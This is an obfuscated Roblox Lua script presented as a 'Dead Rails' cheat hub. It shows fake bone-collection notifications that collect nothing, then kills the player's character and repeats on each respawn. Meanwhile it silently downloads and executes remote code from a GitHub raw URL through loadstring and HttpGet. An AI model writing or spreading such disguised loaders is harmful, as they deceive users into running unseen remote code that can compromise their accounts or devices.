local _0x59bc = game:GetService("Players")
local _0x1fe = game:GetService("StarterGui")
local _0x3572 = game:GetService("VirtualUser")
local _0x204a = _0x59bc.LocalPlayer

_0x204a.Idled:Connect(function()
    _0x3572:Button2Down(Vector2.new())
    task.wait(1)
    _0x3572:Button2Up(Vector2.new())
end)

local _0x267 = function(_0x204a, _0x204a1, _0x204a2)
    _0x1fe:SetCore("SendNotification", {
        Title = _0x204a,
        Text = _0x204a1,
        Duration = _0x204a2 or 3
    })
end

local _0x4a82 = function()
    _0x267("ERLOT HUB - DEAD RAILS", "Welcome!", 5)

    task.spawn(function()
        wait(5)
        local _0xd06 = 0
        local _0x683 = math.random(70, 90)
        local _0x6832 = 30
        local _0x2672 = _0x6832 / _0x683

        while _0xd06 < _0x683 do
            wait(_0x2672 * math.random(50, 100) / 100)
            local _0x3f4 = math.random(1, 4)
            _0xd06 = math.min(_0xd06 + _0x3f4, _0x683)
            _0x267("Bone Collected", "You now have " .. tostring(_0xd06) .. " bones!", 2)
        end

        _0x267("All Bones Collected", tostring(_0x683) .. " bones have been gathered successfully!", 5)
        wait(3)
        _0x267("You Finished", "Let's Reset YOU.", 3)
        task.wait(3)
        _0x204a.Character:BreakJoints()
    end)

    task.spawn(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ringtaa/Rarara.github.io/refs/heads/main/Rara.lua"))()
    end)
end

_0x4a82()

_0x204a.CharacterAdded:Connect(function()
    task.wait(1)
    _0x4a82()
end)
